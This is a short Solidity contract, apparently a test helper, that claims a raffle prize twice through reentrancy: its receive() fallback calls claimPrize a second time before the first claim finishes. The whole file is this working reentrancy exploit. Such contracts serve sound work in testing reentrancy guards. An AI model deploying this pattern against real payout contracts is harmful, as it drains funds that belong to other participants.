// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IPrizeManager {
    function claimPrize(uint256 raffleId) external;
}

contract ReentrantClaimer {
    bool private _done;
    uint256 private _raffleId;
    address private _prizeManager;

    function doubleClaim(address prizeManager, uint256 raffleId) external {
        _raffleId = raffleId;
        _prizeManager = prizeManager;
        IPrizeManager(prizeManager).claimPrize(raffleId);
    }

    receive() external payable {
        if (_done) {
            _done = false;
            _raffleId = 0;
            _prizeManager = address(0);
            return;
        }
        _done = true;
        IPrizeManager(_prizeManager).claimPrize(_raffleId);
    }
}
